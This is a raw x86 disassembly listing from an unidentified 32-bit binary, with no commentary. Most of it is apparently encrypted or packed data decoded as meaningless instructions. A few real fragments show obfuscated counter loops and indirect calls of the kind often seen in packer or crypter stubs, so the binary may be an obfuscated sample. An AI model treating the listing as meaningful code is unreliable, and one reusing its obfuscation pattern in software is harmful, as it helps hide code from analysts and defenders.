  403fe6:	and    al,0x61
  403fe8:	xchg   DWORD PTR [ecx],eax
  403fea:	das    
  403feb:	shl    edx,1
  403fed:	pop    esi
  403fee:	jae    0x40406d
  403ff0:	or     BYTE PTR [edx],0x6b
  403ff3:	nop
  403ff4:	shl    BYTE PTR [edi-0x16267657],1
  403ffa:	rcl    DWORD PTR [esi],cl
  403ffc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ffe:	fistp  DWORD PTR [eax]
  404000:	test   eax,0x77e66132
  404005:	loope  0x404028
  404007:	or     al,0x55
  404009:	ins    BYTE PTR es:[edi],dx
  40400a:	mov    edi,0x71875b30
  40400f:	mov    esi,0x3ef2e19
  404014:	test   al,0x8d
  404016:	arpl   si,di
  404018:	add    dh,0x61
  40401b:	xor    BYTE PTR [ecx],dl
  40401d:	jmp    0x49bc174c
  404022:	sbb    esp,DWORD PTR [eax]
  404024:	cld    
  404025:	jne    0x403fcf
  404027:	xchg   ecx,eax
  404028:	lods   al,BYTE PTR ds:[esi]
  404029:	ficom  DWORD PTR [ebx]
  40402b:	sti    
  40402c:	cmp    cl,bh
  40402e:	jmp    0x403ff0
  404030:	inc    ecx
  404031:	inc    eax
  404032:	fdivr  QWORD PTR ds:0xabd06537
  404038:	cmp    al,0x5a
  40403a:	(bad)  
  40403c:	mov    al,ds:0xffd91406
  404041:	(bad)  
  404042:	(bad)  
  404044:	shl    BYTE PTR [ebx-0x4a],0x19
  404048:	stos   BYTE PTR es:[edi],al
  404049:	jo     0x403fdf
  40404b:	iret   
  40404c:	int3   
  40404d:	fld    DWORD PTR [ebp-0x2e]
  404050:	mov    bh,0x1b
  404052:	int3   
  404053:	mov    eax,ds:0x8efd8a77
  404058:	pop    ds
  404059:	je     0x4040a8
  40405b:	dec    ecx
  40405c:	shl    DWORD PTR [edx],cl
  40405e:	push   edx
  40405f:	ss mov ebx,0x38b00d76
  404065:	xor    DWORD PTR [esi],esp
  404067:	mov    dh,ah
  404069:	push   eax
  40406a:	xlat   BYTE PTR ds:[ebx]
  40406b:	sbb    ebx,DWORD PTR [ecx+0xb]
  40406e:	in     eax,dx
  40406f:	cmp    dh,BYTE PTR [edx+0x31]
  404072:	mov    dh,0x92
  404074:	push   ds
  404075:	push   ebp
  404076:	add    eax,0x622ff821
  40407b:	sar    BYTE PTR [edi+ebp*1+0x1b],1
  40407f:	and    al,0x21
  404081:	cwd    
  404083:	or     al,0x4c
  404085:	push   ss
  404086:	sti    
  404087:	in     al,0xac
  404089:	mov    eax,ds:0x48dba840
  40408e:	cdq    
  40408f:	loopne 0x404018
  404091:	aad    0x4e
  404093:	jle    0x404055
  404095:	enter  0xbc03,0x81
  404099:	and    eax,0x447d4603
  40409e:	pushf  
  40409f:	or     ecx,DWORD PTR [edi]
  4040a1:	mov    esp,0x6b324391
  4040a6:	lods   eax,DWORD PTR ds:[esi]
  4040a7:	xchg   edi,eax
  4040a8:	mov    eax,0x522e2fb1
  4040ad:	mov    DWORD PTR [esi-0x74e88d67],edx
  4040b3:	xchg   DWORD PTR [edx+0x447be36a],esi
  4040b9:	rsm    
  4040bb:	std    
  4040bc:	push   0x8ef47581
  4040c1:	std    
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xa6f7e6c1
  4040e3:	icebp  
  4040e4:	sbb    BYTE PTR [ecx-0x62],dl
  4040e7:	es js  0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404130
  4040ef:	sub    dx,WORD PTR [eax-0x75]
  4040f3:	(bad)  
  4040f4:	lahf   
  4040f5:	sub    al,0xac
  4040f7:	xchg   edx,eax
  4040f8:	xchg   edi,eax
  4040f9:	xor    al,0x36
  4040fb:	and    dl,bl
  4040fd:	xlat   BYTE PTR ds:[ebx]
  4040fe:	xor    ax,0x575e
  404102:	inc    esi
  404103:	mov    bh,0x96
  404105:	loop   0x40417b
  404107:	scas   al,BYTE PTR es:[edi]
  404108:	push   eax
  404109:	inc    edi
  40410a:	adc    DWORD PTR [edi-0xb],esi
  40410d:	xor    al,0x6c
  40410f:	add    DWORD PTR [esi-0xddfbc63],ecx
  404115:	mov    ds:0x9d5dcd34,eax
  40411a:	cmp    edx,edi
  40411c:	imul   esp,DWORD PTR [edi+0x79228f38],0xffffffaf
  404123:	and    BYTE PTR [edi-0x3c],0x9e
  404127:	push   ebp
  404128:	push   ebx
  404129:	jo     0x40414f
  40412b:	pop    esi
  40412c:	xchg   BYTE PTR [eax+0x8a76ba0],bl
  404132:	cmp    al,0x12
  404134:	adc    dl,BYTE PTR [ecx+0x37]
  404137:	cmp    BYTE PTR [esp+edx*2-0x4e2076dd],bh
  40413e:	not    ebp
  404140:	push   edi
  404141:	cwde   
  404142:	push   ds
  404143:	aad    0xa7
  404145:	loopne 0x40418b
  404147:	and    ah,bl
  404149:	mov    ch,0x26
  40414b:	adc    ecx,DWORD PTR [edx]
  40414d:	mov    al,0x23
  40414f:	icebp  
  404150:	int3   
  404151:	or     BYTE PTR [ebx-0x19],0x88
  404155:	pop    edi
  404156:	pop    ds
  404157:	bound  cx,DWORD PTR [ebx+0x2da37799]
  40415e:	sub    eax,0xca7975bb
  404163:	into   
  404164:	test   BYTE PTR [edx],al
  404166:	test   DWORD PTR [edi-0x7e4300fa],eax
  40416c:	dec    ecx
  40416d:	sar    DWORD PTR [ebp+0x7c591382],0x88
  404174:	test   al,0xfd
  404176:	std    
  404177:	leave  
  404178:	test   DWORD PTR [edi-0x7ab81fa9],ebx
  40417e:	push   0x419fb36d
  404183:	repnz jmp 0xcb8:0xa293f9a2
  40418b:	xor    al,0x32
  40418e:	(bad)  
  40418f:	(bad)  
  404190:	cmp    esi,DWORD PTR [ebx+0x64]
  404193:	mov    cl,0x36
  404195:	push   0xffffffc7
  404197:	and    dh,dh
  404199:	pop    ds
  40419a:	cmp    eax,0xd574e07f
  40419f:	jge    0x40420b
  4041a1:	sahf   
  4041a2:	sub    al,0x1d
  4041a4:	psrlq  mm5,QWORD PTR [eax-0x17]
  4041a8:	jbe    0x404185
  4041aa:	push   cs
  4041ab:	push   es
  4041ac:	mov    ah,0x29
  4041ae:	or     BYTE PTR [edi],ah
  4041b0:	loop   0x40417c
  4041b2:	mov    ch,BYTE PTR [esi+edx*4-0x2321f2e0]
  4041b9:	lods   eax,DWORD PTR ds:[esi]
  4041ba:	xchg   ecx,ebp
  4041bc:	stos   BYTE PTR es:[edi],al
  4041bd:	ja     0x4041ac
  4041bf:	add    al,0x44
  4041c1:	in     al,0x62
  4041c3:	fiadd  DWORD PTR [eax+esi*2+0x2ee95ba7]
  4041ca:	loope  0x4041a3
  4041cc:	xor    DWORD PTR [ebx-0x59],edi
  4041cf:	or     al,0x91
  4041d1:	loopne 0x4041c9
  4041d3:	fnstenv [edi]
  4041d5:	outs   dx,DWORD PTR ds:[esi]
  4041d6:	jne    0x4041ac
  4041d8:	fs add eax,0x26657f6a
  4041de:	and    esp,DWORD PTR [ebp+0x75c852b8]
  4041e4:	imul   edi,DWORD PTR [eax],0x40d3169c
  4041ea:	(bad)  
  4041ec:	inc    ebp
  4041ee:	arpl   WORD PTR [edi],bp
  4041f0:	jle    0x404251
  4041f2:	jge    0x40421c
  4041f4:	push   ecx
  4041f5:	in     al,dx
  4041f6:	adc    eax,0xd13512ef
  4041fb:	imul   edx,DWORD PTR [esi-0x1be5c3fa],0x5c8e5e82
  404205:	xchg   esp,eax
  404206:	jne    0x404191
  404208:	lock clc 
  40420a:	sti    
  40420b:	cmc    
  40420c:	jmp    0x6a2b6106
  404211:	add    al,0x2
  404213:	dec    ebp
  404214:	adc    bl,BYTE PTR [edx]
  404216:	sub    al,0xb0
  404218:	jl     0x4041ce
  40421a:	add    al,0x42
  40421c:	and    DWORD PTR [esi],eax
  40421e:	and    eax,0xcb4aef77
  404223:	imul   ecx,DWORD PTR [ebx],0x19475eed
  404229:	pop    edx
  40422a:	mov    ebp,0x4e2670b
  40422f:	(bad)  
  404230:	imul   DWORD PTR [eax]
  404232:	rol    BYTE PTR [ecx+0x6f],1
  404235:	adc    BYTE PTR [edx-0x66499f2],0x69
  40423c:	push   ecx
  40423d:	iret   
  40423e:	lds    ebp,FWORD PTR [edi+ecx*1]
  404241:	sbb    BYTE PTR [ebx+0x6],dh
  404244:	in     eax,dx
  404245:	loope  0x404269
  404247:	cmp    al,0xd6
  404249:	jle    0x404294
  40424b:	in     eax,0xc9
  40424d:	pop    ds
  40424e:	std    
  40424f:	sti    
  404250:	jecxz  0x404299
  404252:	lods   al,BYTE PTR ds:[esi]
  404253:	push   edi
  404254:	repz xor al,0xda
  404257:	xchg   esp,eax
  404258:	add    DWORD PTR [esi+edx*8-0x74127de],ecx
  40425f:	shr    DWORD PTR [esi],cl
  404261:	std    
  404262:	je     0x404229
  404264:	mov    bh,0xdd
  404266:	(bad)  
  404267:	xor    cl,ch
  404269:	sub    esp,DWORD PTR [ebp+0x37]
  40426c:	lea    esp,[eax+0x6e8104a7]
  404272:	xor    dl,BYTE PTR [edi+0x69a7229f]
  404278:	mov    eax,ds:0x65f8c0de
  40427d:	movntps XMMWORD PTR [edi+edi*1],xmm7
  404281:	stc    
  404282:	aam    0x3b
  404284:	mov    al,ch
  404286:	scas   al,BYTE PTR es:[edi]
  404287:	ret    0x16e9
  40428a:	dec    eax
  40428b:	and    DWORD PTR [eax+0x18],edi
  40428e:	and    DWORD PTR ds:0x2f4f1e81,esi
  404294:	pushf  
  404295:	xchg   ecx,eax
  404296:	jge    0x4042c5
  404298:	adc    eax,0x4bc3839a
  40429d:	jge    0x404255
  40429f:	cs mov ebp,0x8c4ea44b
  4042a5:	fwait
  4042a6:	lods   al,BYTE PTR ds:[esi]
  4042a7:	cmp    eax,0xf19c74e5
  4042ac:	cdq    
  4042ad:	pop    esp
  4042af:	pop    esp
  4042b0:	std    
  4042b1:	xor    al,0x76
  4042b3:	sub    al,BYTE PTR es:[ebp+eiz*2-0x63506472]
  4042bb:	div    BYTE PTR [edx+0x33d323bf]
  4042c1:	sub    bl,ch
  4042c3:	xchg   BYTE PTR [edx-0x23],bl
  4042c6:	and    dh,BYTE PTR [edx+ebp*2+0x64]
  4042ca:	jmp    0xdb8c:0x4d3cfa76
  4042d1:	ds and eax,0x22304b16
  4042d7:	push   ds
  4042d8:	jmp    0x2517:0x64b93572
  4042df:	mov    esp,0x597bee6
  4042e4:	cwde   
  4042e5:	cmp    BYTE PTR [ecx+edx*8-0x17],bl
  4042e9:	out    dx,eax
  4042ea:	daa    
  4042eb:	pop    fs
  4042ed:	lahf   
  4042ee:	cmp    esi,0x9e836e95
  4042f4:	(bad)  
  4042f5:	rcl    BYTE PTR [ebx+0x48],cl
  4042f8:	fsub   DWORD PTR [ebx+edi*4+0x7c]
  4042fc:	sahf   
  4042fd:	aam    0x74
  4042ff:	(bad)  
  404300:	sub    BYTE PTR [esi-0x3aa6a905],bl
  404306:	fist   DWORD PTR [ebp+0x2a]
  404309:	cmp    eax,0x6e638274
  40430e:	push   ebp
  40430f:	xor    al,0x7c
  404311:	div    BYTE PTR [ecx-0x24db6]
  404317:	xor    ah,cl
  404319:	(bad)  
  40431a:	jmp    0xddf87ad0
  40431f:	pop    ebp
  404320:	adc    al,0x99
  404322:	mov    ah,0x14
  404324:	jg     0x404372
  404326:	jl     0x40439a
  404328:	add    eax,0xd14b3520
  40432d:	cli    
  40432e:	xchg   edx,eax
  40432f:	stos   BYTE PTR es:[edi],al
  404330:	scas   eax,DWORD PTR es:[edi]
  404331:	or     eax,0x4b0b3b2a
  404336:	xchg   edx,eax
  404337:	(bad)  
  404338:	sub    ebp,DWORD PTR [eax]
  40433a:	mov    edi,0x57bc2da7
  40433f:	cld    
  404340:	mov    ss,WORD PTR ds:0x3c632066
  404346:	dec    ecx
  404347:	xor    DWORD PTR [esi],edi
  404349:	jns    0x4043c4
  40434b:	adc    ah,ch
  40434d:	jns    0x4042f1
  40434f:	push   0x9cb69098
  404354:	inc    edx
  404355:	adc    BYTE PTR fs:[esi-0x22],ah
  404359:	push   eax
  40435a:	cmp    bl,ch
  40435c:	jle    0x4042ee
  40435e:	hlt    
  40435f:	xchg   ebp,ebp
  404361:	sbb    BYTE PTR [eax-0x68],dh
  404364:	aaa    
  404365:	mov    ebx,0x6d908ef2
  40436a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40436b:	test   BYTE PTR [edi+0x1d],bh
  40436e:	jmp    0x404339
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a79d
  4043aa:	add    DWORD PTR ds:0x42a781,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7d5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7d5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7d5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7d5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7d5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a865
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	mov    al,0xb2
  40441b:	xor    al,cl
  40441d:	sbb    al,0x2b
  40441f:	js     0x404499
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x404485
  404426:	add    eax,0xc4cbf10c
  40442b:	jnp    0x404473
  40442d:	stc    
  40442e:	push   ds
  40442f:	and    ah,BYTE PTR ds:[eax]
  404432:	push   0x36381917
  404437:	xchg   edi,eax
  404438:	jmp    0xed74fccb
  40443d:	sahf   
  40443e:	add    al,0xcf
  404440:	in     eax,0xa5
  404442:	jns    0x404425
  404444:	mov    al,0xff
  404446:	das    
  404447:	out    dx,al
  404448:	int3   
  404449:	jns    0x4043f1
  40444b:	sar    BYTE PTR [edx+0x1d59d77],cl
  404451:	aam    0xdb
  404453:	add    esp,DWORD PTR [ebx+eax*1]
  404456:	sub    eax,0x266a48c
  40445b:	dec    eax
  40445c:	or     BYTE PTR [esi+0x7f17f525],al
  404462:	dec    ebx
  404463:	jg     0x4044bd
  404465:	sub    al,dh
  404467:	xor    edi,0x83d9b43c
  40446d:	jg     0x4044e1
  40446f:	pop    eax
  404470:	test   ah,0xc9
  404473:	sub    DWORD PTR [eax+0x22],edx
  404476:	sub    eax,DWORD PTR [ecx]
  404478:	ret    
  404479:	mov    esp,0x44b2cd10
  40447e:	(bad)  
  40447f:	in     eax,0x48
  404481:	mov    DWORD PTR [ebx+0x506ca70f],ebp
  404487:	sbb    ebp,DWORD PTR [eax-0x6d]
  40448a:	into   
  40448b:	or     DWORD PTR [edx+0x3aeea9df],edx
  404491:	div    BYTE PTR [edi+0x23]
  404494:	cs push edx
  404496:	jge    0x404468
  404498:	rol    DWORD PTR [ecx+eax*8-0x7d979dd5],1
  40449f:	sub    bh,dh
  4044a1:	jnp    0x4044a8
  4044a3:	(bad)  
  4044a4:	mov    al,0x50
  4044a6:	(bad)  
  4044a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044a8:	dec    edx
  4044a9:	stos   BYTE PTR es:[edi],al
  4044aa:	shl    BYTE PTR [ebx-0x5d],1
  4044ad:	in     al,dx
  4044ae:	inc    ebx
  4044af:	pusha  
  4044b0:	xchg   edi,eax
  4044b1:	fadd   DWORD PTR [eax+ebp*8+0x4e]
  4044b5:	ins    BYTE PTR es:[edi],dx
  4044b6:	fist   DWORD PTR [ebx-0x4a8db01]
  4044bc:	inc    ecx
  4044bd:	fist   WORD PTR [esi]
  4044bf:	mov    edx,0x96c4f0af
  4044c4:	leave  
  4044c5:	or     bl,BYTE PTR [edi-0x1e]
  4044c8:	lods   al,BYTE PTR ds:[esi]
  4044c9:	pusha  
  4044ca:	fsubr  st(3),st
  4044cc:	mov    ah,0xb3
  4044ce:	std    
  4044cf:	in     eax,dx
  4044d0:	xlat   BYTE PTR ds:[ebx]
  4044d1:	add    eax,0x80c09392
  4044d6:	sbb    dl,BYTE PTR [eax]
  4044d8:	add    BYTE PTR [ebp+0x6d],dl
  4044db:	jp     0x4044c2
  4044dd:	mov    ds:0xd746ec0c,eax
  4044e2:	loopne 0x404466
  4044e4:	dec    DWORD PTR [ecx]
  4044e6:	(bad)  
  4044e7:	cld    
  4044e8:	(bad)  
  4044ea:	jbe    0x40452f
  4044ec:	fild   DWORD PTR [eax+0x40]
  4044ef:	(bad)  [edi]
  4044f1:	cwde   
  4044f2:	adc    edi,esp
  4044f4:	ins    DWORD PTR es:[edi],dx
  4044f5:	ss iret 
  4044f7:	iret   
  4044f8:	sahf   
  4044f9:	push   ebp
  4044fa:	lods   al,BYTE PTR ds:[esi]
  4044fb:	cmp    cl,cl
  4044fd:	pop    ebp
  4044fe:	sub    BYTE PTR [edi+0x27cbd479],dh
  404504:	mul    DWORD PTR [ebx-0x743e55b6]
  40450a:	ja     0x404568
  40450c:	jb     0x4044f2
  40450e:	shr    eax,cl
  404510:	stc    
  404511:	push   ss
  404512:	(bad)  
  404513:	mov    esp,0xe0ad4988
  404518:	out    dx,al
  404519:	mul    DWORD PTR [eax+eax*2-0x2b]
  40451d:	and    al,0xaf
  40451f:	and    eax,0x6cd67235
  404524:	ds xor al,0x5b
  404527:	adc    edx,eax
  404529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452a:	imul   ebp,DWORD PTR [esi+0x24],0x1
  40452e:	cld    
  40452f:	cmp    DWORD PTR [eax-0x45e94325],ebx
  404535:	cmp    DWORD PTR [ecx],eax
  404537:	mov    ?,WORD PTR ds:[esi+0x6e4941fd]
  40453e:	mov    al,ds:0x687e245e
  404543:	dec    eax
  404544:	inc    ebx
  404545:	add    eax,0xc4dfd8f8
  40454a:	jne    0x4044f7
  40454c:	xor    edx,DWORD PTR [edx]
  40454e:	out    dx,eax
  40454f:	mov    WORD PTR [edx-0xb],?
  404552:	sti    
  404553:	adc    DWORD PTR [edi+0x37],esi
  404556:	or     eax,0x51289b81
  40455b:	jne    0x404504
  40455d:	aam    0xce
  40455f:	mov    DWORD PTR [esi+0x77818ac6],eax
  404565:	mov    cl,0x60
  404567:	dec    eax
  404568:	das    
  404569:	mov    BYTE PTR [ebp-0xa],bl
  40456c:	punpckhbw mm4,QWORD PTR [ebx+0x25]
  404570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404571:	out    0xc1,eax
  404573:	out    dx,eax
  404574:	push   edx
  404575:	or     eax,0x3aa846c5
  40457a:	out    dx,al
  40457b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40457c:	adc    DWORD PTR [esp+ebp*2-0x9],esp
  404580:	jg     0x40454b
  404582:	ds dec edi
  404584:	inc    ebx
  404585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404586:	jae    0x404596
  404588:	push   cs
  404589:	pusha  
  40458a:	inc    esi
  40458b:	rcl    DWORD PTR [eax-0xce29aaf],cl
  404591:	pusha  
  404592:	fldenv [ebx+esi*8-0x697d0dad]
  404599:	or     eax,DWORD PTR [ebx-0x9]
  40459c:	mul    ebx
  40459e:	ss adc al,0xee
  4045a1:	sti    
  4045a2:	inc    ebx
  4045a3:	in     al,dx
  4045a4:	ja     0x4045be
  4045a6:	mov    ecx,0xbf7ae980
  4045ab:	out    dx,eax
  4045ac:	mov    ch,bh
  4045ae:	mov    bl,0x61
  4045b0:	(bad)  [esp+esi*8+0xcd06f4f]
  4045b7:	mov    ebp,0x216bdea7
  4045bc:	jnp    0x40458e
  4045be:	fidiv  WORD PTR [ebx+0x25]
  4045c1:	daa    
  4045c2:	js     0x4045cc
  4045c4:	push   ebx
  4045c5:	cs sub al,0x22
  4045c8:	mov    ds:0xef865520,al
  4045cd:	outs   dx,BYTE PTR ds:[esi]
  4045ce:	retf   0x75cc
  4045d1:	rcl    DWORD PTR [ebx],0xa6
  4045d4:	call   0x1c97:0x143058be
  4045db:	dec    esi
  4045dc:	out    0xbb,eax
  4045de:	xchg   ebp,eax
  4045df:	dec    edx
  4045e0:	mov    eax,0x5ab901cd
  4045e5:	out    0x82,eax
  4045e7:	rcr    BYTE PTR [edi],1
  4045e9:	jo     0x4045a6
  4045eb:	push   cs
  4045ec:	pop    edi
  4045ed:	test   BYTE PTR [ebp+0x9d5007d],dl
  4045f3:	or     DWORD PTR [edi+0x7808a533],edi
  4045f9:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4045fb:	jle    0x40467c
  4045fd:	test   BYTE PTR [ecx-0x78b1a5d5],dh
  404603:	sub    DWORD PTR [edi-0x6],esi
  404606:	add    al,0x27
  404608:	scas   eax,DWORD PTR es:[edi]
  404609:	cli    
  40460a:	push   0xb8b7b91d
  40460f:	sub    ebx,DWORD PTR [ecx-0x7cccafce]
  404615:	jge    0x404602
  404617:	call   0xea59:0x78c69625
  40461e:	mov    ebp,0xcc44edfc
  404623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404624:	inc    esp
  404625:	fist   WORD PTR [eax+0x30]
  404628:	xchg   BYTE PTR [ebp-0x49],al
  40462b:	out    dx,al
  40462c:	pop    eax
  40462d:	mov    BYTE PTR [eax],bh
  40462f:	call   0xfafd:0xb81cd431
  404636:	and    ax,WORD PTR [edx+0xe2978e]
  40463d:	xchg   esp,eax
  40463e:	sbb    BYTE PTR [ebp-0x51a320ce],0x58
  404645:	enter  0x999,0x79
  404649:	dec    esi
  40464a:	push   0xffffffea
  40464c:	test   edi,0xbc024d69
  404652:	fwait
  404653:	cmp    DWORD PTR [ecx-0x3a65c413],edx
  404659:	hlt    
  40465a:	idiv   BYTE PTR [ecx+0x17]
  40465d:	lock cwde 
  40465f:	mov    ds:0x40cdb615,eax
  404664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404666:	outs   dx,BYTE PTR ds:[esi]
  404667:	push   cs
  404668:	out    dx,al
  404669:	adc    dh,BYTE PTR [esp+edi*2-0x47]
  40466d:	outs   dx,BYTE PTR ds:[esi]
  40466e:	adc    dh,ch
  404670:	mov    dh,0x46
  404672:	adc    al,0x2f
  404674:	jecxz  0x40460d
  404676:	add    DWORD PTR ds:0xb3c44ef8,ebp
  40467c:	rcr    DWORD PTR [ebx+edi*2-0x51c55338],1
  404683:	outs   dx,DWORD PTR ds:[esi]
  404684:	stos   BYTE PTR es:[edi],al
  404685:	inc    esp
  404686:	cmp    bh,BYTE PTR [ecx-0x36db28f9]
  40468c:	jmp    0x404621
  40468e:	push   es
  40468f:	add    BYTE PTR [ebx+edx*2],bl
  404692:	xchg   bh,cl
  404694:	out    0x4a,al
  404696:	rol    DWORD PTR [ebx+0x39],cl
  404699:	lods   eax,DWORD PTR ds:[esi]
  40469a:	mov    tr0,ebp
  40469d:	fiadd  DWORD PTR [edx-0x4f]
  4046a0:	jns    0x4046c0
  4046a2:	xor    esi,esp
  4046a4:	mov    ds:0xf814881b,eax
  4046a9:	sbb    edx,DWORD PTR [ebx]
  4046ab:	bound  edi,QWORD PTR [edi+ebx*4+0x7644595e]
  4046b2:	in     eax,dx
  4046b3:	jge    0x404721
  4046b5:	mov    dh,0x44
  4046b7:	fst    QWORD PTR [ebx+eax*2]
  4046ba:	out    dx,al
  4046bb:	jo     0x40467e
  4046bd:	imul   edi,DWORD PTR [edi-0x3c4b6ca8],0x4
  4046c4:	mov    bl,0xca
  4046c6:	arpl   WORD PTR [esi-0x5c],dx
  4046c9:	cmc    
  4046ca:	adc    al,0xd7
  4046cc:	fdivr  DWORD PTR [ecx-0x31bb0b8f]
  4046d2:	test   BYTE PTR [esp+esi*4-0x2af2e528],dl
  4046d9:	xchg   BYTE PTR [esi],cl
  4046db:	and    eax,0x12e64f46
  4046e0:	xor    ecx,DWORD PTR [ecx+edx*4]
  4046e3:	popa   
  4046e4:	not    DWORD PTR [ebx+ebx*8+0x239b855c]
  4046eb:	js     0x40467f
  4046ed:	jmp    0x40470b
  4046ef:	or     al,0x40
  4046f1:	add    eax,0x10aa8924
  4046f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f7:	rcl    DWORD PTR [esi-0x7f],cl
  4046fa:	and    eax,0x42a795
  4046ff:	add    BYTE PTR [eax],al
  404701:	add    BYTE PTR [eax],al
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a795
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a795,esi
  404715:	cmp    DWORD PTR ds:0x42a795,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a795,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a85d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa68
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0xe75183de
  404770:	pop    ebx
  404771:	sbb    al,0x71
  404773:	sub    DWORD PTR [eax+0x78],edi
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40477f
  40477b:	jl     0x40476f
  40477d:	add    edx,edx
  40477f:	or     ch,dh
  404781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404782:	dec    edx
  404783:	retf   0x379a
  404786:	and    eax,0x174d566f
  40478b:	cwde   
  40478c:	adc    ah,bh
  40478e:	(bad)  
  40478f:	jmp    0x4047c8
  404791:	jle    0x4047e2
  404793:	pop    ecx
  404794:	lea    esi,[edi]
  404796:	fs push edx
  404798:	bound  esi,QWORD PTR [edx+0x3724aeb0]
  40479e:	into   
  40479f:	push   cs
  4047a0:	mov    esi,0xcb4cb44e
  4047a5:	out    dx,al
  4047a6:	push   0x94df6871
  4047ab:	fcom   DWORD PTR [esi+eiz*2]
  4047ae:	push   ebp
  4047af:	(bad)  [esi+0x9ed8b3e]
  4047b5:	(bad)  
  4047b6:	lock (bad) [edx-0x74547216]
  4047bd:	adc    eax,0xfd69afac
  4047c2:	pop    ebp
  4047c3:	fld    TBYTE PTR [ebp-0x52]
  4047c6:	mov    ecx,0xb62034de
  4047cb:	xchg   ebx,eax
  4047cc:	dec    ecx
  4047cd:	in     eax,0x6
  4047cf:	outs   dx,DWORD PTR ds:[esi]
  4047d0:	pop    esi
  4047d1:	(bad)  [eax-0x633bb679]
  4047d7:	out    0xf9,eax
  4047d9:	add    al,0xc8
  4047db:	ja     0x4047a3
  4047dd:	shl    DWORD PTR [edx+0x8949539],cl
  4047e3:	test   al,0xae
  4047e5:	mov    dl,0xda
  4047e7:	repnz pop ss
  4047e9:	xchg   ebp,eax
  4047ea:	les    esp,FWORD PTR [edi]
  4047ec:	nop
  4047ed:	stos   DWORD PTR es:[edi],eax
  4047ee:	adc    DWORD PTR [ecx+0x1a],esi
  4047f1:	ja     0x40481a
  4047f3:	mov    DWORD PTR [edx],esp
  4047f5:	xor    bh,cl
  4047f7:	mov    edx,0x1380d30a
  4047fc:	retf   
  4047fd:	and    cl,BYTE PTR ss:[ebx+edi*1]
  404801:	jmp    0x40485a
  404803:	push   0x9c0cb9cb
  404808:	mov    al,0x65
  40480a:	ss and dl,ah
  40480d:	mov    dh,0xa7
  40480f:	add    BYTE PTR [edi-0x6b],al
  404812:	or     al,0x0
  404814:	cmp    dh,BYTE PTR [esi+0x5]
  404817:	mov    ah,cl
  404819:	aaa    
  40481a:	and    al,0xfd
  40481c:	loop   0x404824
  40481e:	mov    bh,0x4f
  404820:	sbb    BYTE PTR [edi+0x7f62d2e8],cl
  404826:	add    esi,DWORD PTR [ecx-0xa17c4f1]
  40482c:	pop    edx
  40482d:	push   ebx
  40482e:	sub    DWORD PTR [edi],edi
  404830:	outs   dx,BYTE PTR ds:[esi]
